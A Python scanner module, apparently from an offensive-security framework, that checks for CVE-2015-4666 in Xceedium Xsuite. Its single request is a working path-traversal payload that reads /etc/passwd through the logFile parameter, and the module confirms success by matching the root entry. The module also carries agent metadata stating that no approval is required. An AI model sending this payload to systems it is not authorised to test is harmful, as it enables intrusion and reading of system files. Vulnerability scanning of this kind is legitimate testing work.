#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Xceedium Xsuite 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Xceedium Xsuite <=2.4.4.5 - Local File Inclusion Detection',
        'description': 'Xceedium Xsuite 2.4.4.5 and earlier is vulnerable to local file inclusion via opm/read_sessionlog.php that allows remote attackers to read arbitrary files in the logFile parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'xceedium', 'xsuite', 'lfi', 'packetstorm', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.modzero.com/advisories/MZ-15-02-Xceedium-Xsuite.txt',
            'http://packetstormsecurity.com/files/132809/Xceedium-Xsuite-Command-Injection-XSS-Traversal-Escalation.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-4666',
            'https://support.ca.com/us/product-content/recommended-reading/security-notices/ca20180614-01--security-notice-for-ca-privileged-access-manager.html',
            'https://www.exploit-db.com/exploits/37708/',
        ],
        'cve': 'CVE-2015-4666',
    }

    def run(self):
        r = self.http_request(method="GET", path='/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Xceedium Xsuite <=2.4.4.5 - Local File Inclusion detected",
                path='/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd',
            )
            return True
        return False

